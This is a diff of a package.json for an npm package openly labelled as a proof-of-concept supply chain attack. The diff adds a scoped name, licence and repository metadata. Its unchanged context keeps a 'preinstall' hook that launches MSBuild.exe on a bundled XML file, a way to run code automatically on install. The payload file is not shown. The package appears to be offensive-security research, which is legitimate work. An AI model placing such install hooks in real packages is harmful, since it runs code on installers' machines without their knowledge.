@@ -1,5 +1,5 @@
 {
-  "name": "npm-supply-chain-poc",
+  "name": "@chopicalqui/npm-supply-chain-poc",
   "version": "0.0.1",
   "description": "This repository demonstrates a proof-of-concept (PoC) for an NPM supply chain attack.",
   "main": "index.js",
@@ -8,5 +8,18 @@
     "preinstall": "c:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe src\\msbuild.xml"
   },
   "author": "Chopicalqui",
-  "license": "GPLv3"
+  "license": "GPL-3.0-or-later",
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/chopicalqui/npm-supply-chain-poc.git"
+  },
+  "keywords": [
+    "supply-chain-attacks",
+    "offsec",
+    "npm"
+  ],
+  "bugs": {
+    "url": "https://github.com/chopicalqui/npm-supply-chain-poc/issues"
+  },
+  "homepage": "https://github.com/chopicalqui/npm-supply-chain-poc#readme"
 }
